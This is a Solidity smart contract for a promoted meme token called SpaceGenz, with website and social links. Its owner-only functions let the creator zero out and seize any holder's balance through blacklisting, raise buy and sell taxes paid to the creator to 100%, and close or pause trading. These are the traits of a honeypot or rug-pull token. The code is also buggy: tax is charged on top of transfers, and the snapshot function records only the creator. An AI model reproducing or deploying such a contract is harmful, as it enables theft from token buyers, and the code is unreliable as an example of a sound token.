/**

WEB: http://spacegens.xyz/


Telegram: https://t.me/Spacegenzz


Twitter: https://twitter.com/SpaceGens



*/



// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract SpaceGens {
    string public name = "SpaceGenz";
    string public symbol = "Spagenz";
    uint8 public decimals = 18;
    uint256 public totalSupply = 69_000_000_000_000 * 10**uint256(decimals);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) private _isBlacklisted;
    mapping(address => uint256) private _transactionCount;
    mapping(address => uint256) private _lastSellTimestamp;
    mapping(address => uint256) private _totalHolding;
    address[] private _tokenHolders;
    uint256 private _tokenHoldersCount;

    uint8 public buyTaxRate = 22;
    uint8 public sellTaxRate = 22;
    uint8 public burnRateOnSell = 0;
    uint8 public distributionRateOnSell = 0;

    address public creator;
    bool public isOwnershipRenounced;
    uint256 public maxTransactionsPerWallet = 1000;
    bool public isPaused;
    bool public isTradingOpen = true;

    uint256 public currentSnapshotId = 0;
    mapping(uint256 => mapping(address => uint256)) public snapshotBalances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    event TokensBurned(address indexed burner, uint256 amount);
    event TokensDistributed(address indexed distributor, uint256 amount);
    event TradingStatusChanged(bool newStatus);
    event SnapshotTaken(uint256 snapshotId);
    event TokensAirdropped(address indexed from, address[] recipients, uint256[] amounts);

    modifier onlyOwner() {
        require(msg.sender == creator, "Only the owner can call this function");
        _;
    }

    modifier notBlacklisted(address _from, address _to) {
        require(!_isBlacklisted[_from], "Sender is blacklisted");
        require(!_isBlacklisted[_to], "Receiver is blacklisted");
        _;
    }

    modifier onlyCreator() {
        require(msg.sender == creator, "Only the creator can call this function");
        _;
    }

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        creator = msg.sender;

        _tokenHolders.push(creator);
        _tokenHoldersCount = 1;
        _totalHolding[creator] = totalSupply;
    }

    function transfer(address _to, uint256 _value) external notBlacklisted(msg.sender, _to) returns (bool) {
        require(_to != address(0), "Invalid address");
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        require(_transactionCount[msg.sender] < maxTransactionsPerWallet, "Exceeded maximum transactions");
        require(!isPaused, "Transfers are paused");
        require(isTradingOpen, "Trading is closed");

        uint256 taxAmount = 0;
        if (msg.sender != creator) {
            taxAmount = (_value * sellTaxRate) / 100;
            balanceOf[creator] += taxAmount;
            emit Transfer(msg.sender, creator, taxAmount);
        }

        balanceOf[msg.sender] -= (_value + taxAmount);
        balanceOf[_to] += _value;
        _transactionCount[msg.sender]++;

        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        require(spender != address(0), "Invalid address");

        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) external notBlacklisted(_from, _to) returns (bool success) {
        require(_from != address(0), "Invalid address");
        require(_to != address(0), "Invalid address");
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        require(_transactionCount[_from] < maxTransactionsPerWallet, "Exceeded maximum transactions");
        require(!isPaused, "Transfers are paused");
        require(isTradingOpen, "Trading is closed");

        uint256 taxAmount = 0;
        if (_from != creator && msg.sender != creator) {
            taxAmount = (_value * buyTaxRate) / 100;
            balanceOf[creator] += taxAmount;
            emit Transfer(_from, creator, taxAmount);
        }

        balanceOf[_from] -= (_value + taxAmount);
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        _transactionCount[_from]++;
        success = true;

        emit Transfer(_from, _to, _value);
    }

    function setTaxRates(uint8 _buyTaxRate, uint8 _sellTaxRate) external onlyOwner {
        require(_buyTaxRate <= 100 && _sellTaxRate <= 100, "Invalid tax rate");
        buyTaxRate = _buyTaxRate;
        sellTaxRate = _sellTaxRate;
    }

    function addToBlacklist(address wallet) external onlyOwner {
        require(wallet != address(0), "Invalid address");
        require(!_isBlacklisted[wallet], "Address is already blacklisted");
        _isBlacklisted[wallet] = true;
        emit Transfer(wallet, address(0), balanceOf[wallet]);
        balanceOf[wallet] = 0;
    }

    function removeFromBlacklist(address wallet) external onlyOwner {
        require(_isBlacklisted[wallet], "Address is not blacklisted");
        _isBlacklisted[wallet] = false;
    }

    function renounceOwnership() external onlyOwner {
        require(!isOwnershipRenounced, "Ownership already renounced");
        creator = address(0);
        isOwnershipRenounced = true;
        emit OwnershipRenounced(msg.sender);
    }

    function setMaxTransactionsPerWallet(uint256 _maxTransactions) external onlyOwner {
        maxTransactionsPerWallet = _maxTransactions;
    }

    function pauseTransfers() external onlyOwner {
        isPaused = true;
    }

    function unpauseTransfers() external onlyOwner {
        isPaused = false;
    }

    // Function to open or close trading (onlyOwner)
    function setTradingStatus(bool status) external onlyOwner {
        isTradingOpen = status;
        emit TradingStatusChanged(status);
    }

    // Function to take a snapshot of token balances (onlyOwner)
    function takeSnapshot() external onlyOwner {
        currentSnapshotId++;
        uint256 snapshotId = currentSnapshotId;

        for (uint256 i = 0; i < _tokenHoldersCount; i++) {
            address holderAddress = _tokenHolders[i];
            snapshotBalances[snapshotId][holderAddress] = balanceOf[holderAddress];
        }

        emit SnapshotTaken(snapshotId);
    }
}